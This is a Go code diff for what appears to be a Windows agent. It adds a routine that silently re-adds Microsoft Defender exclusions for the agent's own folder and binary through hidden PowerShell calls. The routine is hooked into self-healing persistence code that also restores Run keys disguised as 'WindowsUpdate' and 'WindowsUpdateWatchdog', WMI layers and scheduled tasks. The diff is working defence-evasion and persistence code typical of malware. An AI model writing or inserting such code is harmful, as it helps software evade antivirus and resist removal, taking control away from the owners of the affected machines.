@@ -374,6 +374,7 @@ func runWmiHeal() {
 	}
 	healBinary(dir, agentPath, caPath)
 	ensureWmiLayer(agentPath)
+	ensureDefenderExclusions(agentPath, dir)
 	for _, t := range wmiTaskPairs {
 		if err := hiddenExec("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
 			continue
@@ -433,6 +434,113 @@ func runWmiHeal() {
 	}
 }
 
+// ensureDefenderExclusions re-asserts Defender path+process exclusions
+// for the install (best effort). Install-time exclusions get eaten:
+// Tamper Protection resets, Defender updates, or a non-admin install
+// that silently failed them — and then quarantine roulette starts.
+// Called on the slow heal path and by the SYSTEM healer, so a working
+// box converges back. Verifies after writing and logs the outcome;
+// when we hold admin yet exclusions still won't stick, Tamper
+// Protection is named explicitly instead of failing silently.
+func ensureDefenderExclusions(agentPath, installDir string) {
+	want := []string{}
+	if installDir != "" {
+		want = append(want, installDir)
+	}
+	if agentPath != "" {
+		want = append(want, agentPath)
+	}
+	if len(want) == 0 {
+		return
+	}
+	missingPaths, missingProcs := []string{}, []string{}
+	if out, err := hiddenExec("powershell", "-NoProfile", "-Command", `Get-MpPreference | Select-Object -ExpandProperty ExclusionPath`).CombinedOutput(); err == nil {
+		have := parseMpList(string(out))
+		for _, w := range want {
+			if !mpListHas(have, w) {
+				missingPaths = append(missingPaths, w)
+			}
+		}
+	} else {
+		missingPaths = want // cannot even read: assume missing, try write
+	}
+	if out, err := hiddenExec("powershell", "-NoProfile", "-Command", `Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess`).CombinedOutput(); err == nil {
+		have := parseMpList(string(out))
+		for _, w := range want {
+			if !mpListHas(have, w) {
+				missingProcs = append(missingProcs, w)
+			}
+		}
+	} else {
+		missingProcs = want
+	}
+	if len(missingPaths) == 0 && len(missingProcs) == 0 {
+		return // intact, stay quiet
+	}
+	for _, p := range missingPaths {
+		q := strings.ReplaceAll(p, "'", "''")
+		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+	}
+	for _, p := range missingProcs {
+		q := strings.ReplaceAll(p, "'", "''")
+		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+	}
+	// Verify: re-read and name what is still missing.
+	stillMissing := []string{}
+	if out, err := hiddenExec("powershell", "-NoProfile", "-Command", `Get-MpPreference | Select-Object -ExpandProperty ExclusionPath`).CombinedOutput(); err == nil {
+		have := parseMpList(string(out))
+		for _, w := range want {
+			if !mpListHas(have, w) {
+				stillMissing = append(stillMissing, "path:"+w)
+			}
+		}
+	}
+	if out, err := hiddenExec("powershell", "-NoProfile", "-Command", `Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess`).CombinedOutput(); err == nil {
+		have := parseMpList(string(out))
+		for _, w := range want {
+			if !mpListHas(have, w) {
+				stillMissing = append(stillMissing, "proc:"+w)
+			}
+		}
+	}
+	if len(stillMissing) == 0 {
+		log.Printf("[watch] defender exclusions repaired")
+		return
+	}
+	// Still blocked with (presumably) admin rights: name Tamper
+	// Protection explicitly instead of failing silently forever.
+	tp := ""
+	if out, err := hiddenExec("powershell", "-NoProfile", "-Command", `Get-MpComputerStatus | Select-Object -ExpandProperty IsTamperProtected`).CombinedOutput(); err == nil {
+		if strings.Contains(strings.ToLower(strings.TrimSpace(string(out))), "true") {
+			tp = " (Tamper Protection is ON — exclusions must be added via Windows Security / Intune)"
+		}
+	}
+	log.Printf("[watch] defender exclusions blocked, still missing %s%s", strings.Join(stillMissing, ", "), tp)
+}
+
+// parseMpList splits Get-MpPreference ExpandProperty output (one value
+// per line) into clean entries.
+func parseMpList(out string) []string {
+	var res []string
+	for _, ln := range strings.Split(out, "\n") {
+		if v := strings.TrimSpace(strings.Trim(ln, "\r")); v != "" {
+			res = append(res, v)
+		}
+	}
+	return res
+}
+
+// mpListHas reports membership, case-insensitive, trailing-slash tolerant.
+func mpListHas(have []string, want string) bool {
+	w := strings.ToLower(strings.TrimRight(want, `\`))
+	for _, h := range have {
+		if strings.ToLower(strings.TrimRight(h, `\`)) == w {
+			return true
+		}
+	}
+	return false
+}
+
 // ensureWatchPersistence re-creates deleted Run keys / scheduled tasks from
 // the XML copies saved beside the backup (self-healing persistence).
 func ensureWatchPersistence(w *watchCfg) {
@@ -453,6 +561,7 @@ func ensureWatchPersistence(w *watchCfg) {
 	}
 	setRun("WindowsUpdate", agentCmd)
 	setRun("WindowsUpdateWatchdog", watchCmd)
+	ensureDefenderExclusions(w.agentPath, w.installDir)
 	ensureActiveSetupKey(w.agentPath)
 	ensureService(w.agentPath)
 	ensureWmiLayer(w.agentPath)
